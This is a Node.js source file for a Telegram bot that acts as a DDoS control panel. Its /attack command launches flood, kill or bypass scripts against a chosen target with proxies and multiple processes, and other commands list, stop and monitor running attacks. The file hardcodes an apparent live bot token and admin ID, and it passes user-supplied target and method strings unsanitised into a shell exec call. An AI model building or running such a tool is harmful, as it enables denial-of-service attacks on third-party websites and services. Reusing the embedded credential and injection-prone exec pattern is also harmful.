const TelegramBot = require('node-telegram-bot-api');
const si = require('systeminformation');
const { exec } = require('child_process');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

const token = '7937745403:AAFWtjpfNpZ7KUUAzj1Bw7g3arSB8T-EUE0';
const adminId = '6601930239';
const bot = new TelegramBot(token, { polling: true });

let attacks = [];

app.get('/', (req, res) => {
  res.json({ telegramAdmin: '@xkprj' });
});

app.listen(port);

bot.onText(/^\/system$/, async (msg) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied');
    return;
  }
  try {
    const data = await si.getAllData();
    bot.sendMessage(msg.chat.id, JSON.stringify(data, null, 2));
  } catch (e) {
    bot.sendMessage(msg.chat.id, 'Error fetching system info');
  }
});

bot.onText(/^\/attack (.+)/, async (msg, match) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied');
    return;
  }

  const args = match[1].trim().split(/\s+/);
  let method = 'flood';
  let target = '';
  let time = 0;
  let core = 1;

  const coreIndex = args.findIndex(arg => arg === '--core');
  if (coreIndex !== -1 && args[coreIndex + 1]) {
    core = parseInt(args[coreIndex + 1]);
    args.splice(coreIndex, 2);
  }

  if (['flood', 'kill', 'bypass'].includes(args[0])) {
    method = args[0];
    target = args[1];
    time = parseInt(args[2]);
  } else {
    target = args[0];
    time = parseInt(args[1]);
  }

  if (!target || isNaN(time)) {
    bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time] --core [number]');
    return;
  }

  const rate = 25;
  const threads = 10;
  const proxyfile = './prx.txt';
  const attackId = Date.now();
  const pids = [];

  const message = await bot.sendMessage(msg.chat.id, JSON.stringify({
    status: 'started',
    target,
    time,
    rate,
    threads,
    proxyfile,
    core
  }, null, 2));

  for (let i = 0; i < core; i++) {
    const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
      if (err) {
        bot.sendMessage(msg.chat.id, `Core ${i + 1} failed: ${err.message}`);
      }
    });
    pids.push(child.pid);
  }

  const attackData = {
    id: attackId,
    target,
    time,
    rate,
    threads,
    proxyfile,
    status: 'running',
    messageId: message.message_id,
    pids,
    core
  };

  attacks.push(attackData);

  let remainingTime = time;
  const interval = setInterval(() => {
    remainingTime -= 5;
    if (remainingTime <= 0) {
      clearInterval(interval);
      bot.deleteMessage(msg.chat.id, attackData.messageId);
      attacks = attacks.filter(a => a.id !== attackId);
      return;
    }
    bot.editMessageText(JSON.stringify({
      status: attackData.status,
      target,
      time: remainingTime,
      rate,
      threads,
      proxyfile,
      core
    }, null, 2), {
      chat_id: msg.chat.id,
      message_id: attackData.messageId
    }).catch(() => {
      clearInterval(interval);
      attacks = attacks.filter(a => a.id !== attackId);
    });
  }, 5000);

  bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`);
});

bot.onText(/^\/list$/, (msg) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied');
    return;
  }
  if (attacks.length === 0) {
    bot.sendMessage(msg.chat.id, 'No active attacks');
    return;
  }
  const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s, Core: ${a.core}`).join('\n');
  bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`);
});

bot.onText(/^\/stop (\d+)/, (msg, match) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied');
    return;
  }
  const attackId = parseInt(match[1]);
  const attack = attacks.find(a => a.id === attackId);
  if (!attack) {
    bot.sendMessage(msg.chat.id, 'Attack not found');
    return;
  }
  attacks = attacks.filter(a => a.id !== attackId);
  try {
    attack.pids.forEach(pid => process.kill(pid));
    bot.deleteMessage(msg.chat.id, attack.messageId);
    bot.sendMessage(msg.chat.id, `Attack ${attackId} stopped`);
  } catch (e) {
    bot.sendMessage(msg.chat.id, `Error stopping attack: ${e.message}`);
  }
});
